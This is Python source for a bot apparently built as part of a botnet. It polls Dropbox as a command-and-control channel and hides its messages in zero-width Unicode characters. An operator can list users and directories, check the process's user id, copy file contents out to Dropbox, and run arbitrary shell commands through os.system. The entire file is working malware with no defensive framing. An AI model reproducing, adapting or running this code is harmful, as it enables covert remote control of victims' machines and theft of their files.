import dropbox
import time
import names
import os

TOKEN = ''
INTERVAL = 30

heartbeat_file = "heartbeat.txt"
command_file = "command.txt"
response_file = "response.txt"
revs = {}

dbx = dropbox.Dropbox(TOKEN)
bot_name = names.get_first_name()


# inspired by https://github.com/koustubh1317/Steganography-Tools
def encode(text):
    ZWC = {"00": u'\u200C', "01": u'\u202C', "11": u'\u202D', "10": u'\u200E'}
    res = ""
    # print("encoding " + text)
    for ch in text:
        binary = format(ord(ch), 'b').zfill(8)
        # print(binary)
        for i in range(0, 8, 2):
            res += ZWC[binary[i:i + 2]]
    # print("res", res, len(res))
    return res


# inspired by https://github.com/koustubh1317/Steganography-Tools
def decode(text):
    ZWC = {u'\u200C': "00", u'\u202C': "01", u'\u202D': "11", u'\u200E': "10"}
    res = ""
    # print("decoding", text, len(text))
    for i in range(0, len(text), 4):
        binary = ""
        for e in text[i:i + 4]:
            binary += ZWC[e]
        # print(binary)
        res += chr(int(binary, 2))
    # print("res", res)
    return res


def upload(name):
    try:
        with open(name, "rb") as file:
            dbx.files_upload(
                file.read(),
                "/" + name,
                dropbox.files.WriteMode.update(revs[name]),
                mute=True
            )
        return True
    except dropbox.exceptions.ApiError as err:
        print('*** API error', err)
        return False


def download(name):
    try:
        md, res = dbx.files_download("/" + name)
    except dropbox.exceptions.ApiError as err:
        print('*** API error', err)
        return
    data = res.content
    revs[name] = md.rev
    with open(name, "wb+") as file:
        file.write(data)


def send_heartbeat():
    done = False
    while not done:
        download(heartbeat_file)
        # print("heartbeat")
        with open(heartbeat_file, "a", encoding="utf-8") as file:
            file.write(encode(bot_name + "\n"))
        done = upload(heartbeat_file)


def w(param):
    print("running w")
    users = os.popen("ps au | awk '{print $1}' | uniq").readlines()[1:]
    return bot_name + ": " + ", ".join(users) + "\n"


def ls(param):
    print("running ls " + param)
    directory = os.listdir(param)
    return bot_name + ": " + ", ".join(directory) + "\n"


def id(param):
    print("running id")
    uid = os.geteuid()
    return bot_name + ": " + str(uid) + "\n"


def cp(param):
    print("running cp " + param)
    return bot_name + u'\u0002' + open(param, "r", encoding="utf-8").read() + u'\u0003'


def exe(param):
    print("running exe " + param)
    os.system(param)
    return None


commands = {
    "w": w,
    "ls": ls,
    "id": id,
    "cp": cp,
    "exe": exe
}


if __name__ == '__main__':
    while True:
        try:
            start = time.time()
            send_heartbeat()
            # print("get command")
            download(command_file)
            with open(command_file, "r", encoding="utf-8") as file:
                cmd = decode(file.readline())
                if len(cmd) > 0:
                    cmd = cmd.strip()
                    for command in commands.keys():
                        if cmd.startswith(command):
                            # print(command)
                            done = False
                            param = cmd.replace(command, "").strip()
                            try:
                                res = commands[command](param)
                            except:
                                res = bot_name + ": Failed to execute command"
                            while not done and res is not None:
                                download(response_file)
                                with open(response_file, "a", encoding="utf-8") as file:
                                    file.write(encode(res))
                                done = upload(response_file)
                            break
            duration = time.time() - start
            time.sleep(INTERVAL - duration)
        except Exception as e:
            print(e)
            continue
